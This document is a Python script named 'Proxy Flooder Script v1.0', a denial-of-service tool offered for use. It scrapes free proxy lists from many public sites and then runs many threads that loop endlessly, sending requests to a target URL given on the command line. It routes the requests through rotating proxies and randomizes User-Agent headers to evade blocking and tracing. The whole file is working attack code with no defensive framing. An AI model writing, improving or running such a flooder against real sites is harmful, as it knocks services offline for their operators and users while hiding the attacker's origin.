import requests
from bs4 import BeautifulSoup
from itertools import cycle
import threading
import argparse
import random

# ANSI escape codes for colors
class Colors:
    SUCCESS = '\033[92m'  # Green
    FAILURE = '\033[91m'  # Red
    INFO = '\033[93m'     # Yellow
    BANNER = '\033[94m'   # Blue
    RESET = '\033[0m'     # Reset to default

banner = f"""
{Colors.BANNER}
=======================================
    Proxy Flooder Script v1.0
    Created by Sheikh Nightshader
=======================================
{Colors.RESET}
"""

print(banner)

# Configuration using argparse
parser = argparse.ArgumentParser(description='Proxy Flooder Script')
parser.add_argument('--url', required=True, help='Target URL to flood. Example: http://example.com')
parser.add_argument('--threads', type=int, default=20, help='Number of threads to use (default: 20). Example: 10')
parser.add_argument('--timeout', type=int, default=2, help='Timeout for each request in seconds (default: 2). Example: 5')
parser.add_argument('--proxy-file', help='Path to a text file containing custom proxies (one per line). Example: proxies.txt')
args = parser.parse_args()

target_url = args.url
num_threads = args.threads
request_timeout = args.timeout
proxy_file = args.proxy_file

# Updated list of proxy sources (free proxy providers)
proxy_sources = [
    'https://www.sslproxies.org/',   # SSL Proxies
    'https://free-proxy-list.net/',  # Free Proxy List
    'https://www.us-proxy.org/',     # US Proxies
    'https://www.socks-proxy.net/',  # Socks Proxies
    'https://www.proxyscrape.com/free-proxy-list',  # ProxyScrape
    'https://spys.one/en/free-proxy-list/',          # Spys.one
    'https://hidemy.name/en/proxy-list/',            # HideMy.name
    'https://www.proxy-list.download/',              # ProxyList+
    'https://www.proxy-list.download/',              # Proxy-List.download
    'https://www.socks-proxy.net/',                  # Socks-Proxy.net
    'https://www.proxynova.com/proxy-server-list/',  # ProxyNova
    'https://www.freeproxylists.net/',                # FreeProxyList
    'https://www.globalproxy.io/free-proxy-list/',    # GlobalProxy
    'https://www.proxies.io/proxies/',                # Proxies.io
]

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
]

def scrape_proxies():
    proxies = set()  # Use a set to avoid duplicate proxies
    for source_url in proxy_sources:
        try:
            print(f"{Colors.INFO}Scraping proxies from {source_url}...{Colors.RESET}")
            response = requests.get(source_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            # Scrape proxies from the proxy table
            for row in soup.find_all('tr')[1:]:  # Skip the header row
                columns = row.find_all('td')
                if len(columns) >= 2:
                    ip = columns[0].text.strip()
                    port = columns[1].text.strip()
                    proxies.add(f"http://{ip}:{port}")
        except Exception as e:
            print(f"{Colors.FAILURE}Error scraping proxies from {source_url}: {e}{Colors.RESET}")
    
    return list(proxies)

def load_custom_proxies(file_path):
    try:
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
        print(f"{Colors.INFO}Loaded {len(proxies)} proxies from {file_path}{Colors.RESET}")
        return proxies
    except FileNotFoundError:
        print(f"{Colors.FAILURE}Error: The file {file_path} was not found.{Colors.RESET}")
        return []

def proxy_request(proxy):
    headers = {
        'User-Agent': random.choice(user_agents)  # Randomize User-Agent headers
    }
    try:
        # Sending request via the proxy with headers
        response = requests.get(target_url, proxies={'http': proxy, 'https': proxy}, headers=headers, timeout=request_timeout)
        # Print the proxy address and status code of each request
        if response.status_code == 200:
            print(f"{Colors.SUCCESS}Request sent through proxy: {proxy}, Status Code: {response.status_code}{Colors.RESET}")
    except requests.RequestException:
        # Optionally log failures to a file or handle as needed
        pass  # Suppress error messages

def flood_proxies(proxies):
    proxy_pool = cycle(proxies)  # Cycle through proxies endlessly
    while True:
        proxy = next(proxy_pool)
        proxy_request(proxy)

def main():
    print(f"{Colors.INFO}Target URL: {target_url}{Colors.RESET}")
    
    # Load custom proxies from file if provided
    if proxy_file:
        proxies = load_custom_proxies(proxy_file)
    else:
        print(f"{Colors.INFO}Scraping proxies from multiple sources...{Colors.RESET}")
        proxies = scrape_proxies()
    
    if not proxies:
        print(f"{Colors.FAILURE}No proxies found. Please check the proxy sources or custom proxy file.{Colors.RESET}")
        return
    
    print(f"{Colors.INFO}Starting flood with {len(proxies)} proxies.{Colors.RESET}")

    # Start threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=flood_proxies, args=(proxies,))
        thread.daemon = True  # Set daemon so threads close when the main program exits
        thread.start()
        threads.append(thread)

    # Keep main thread alive
    try:
        while True:
            pass  # Infinite loop to keep threads running
    except KeyboardInterrupt:
        print(f"{Colors.INFO}\nStopping flood...{Colors.RESET}")

if __name__ == "__main__":
    main()
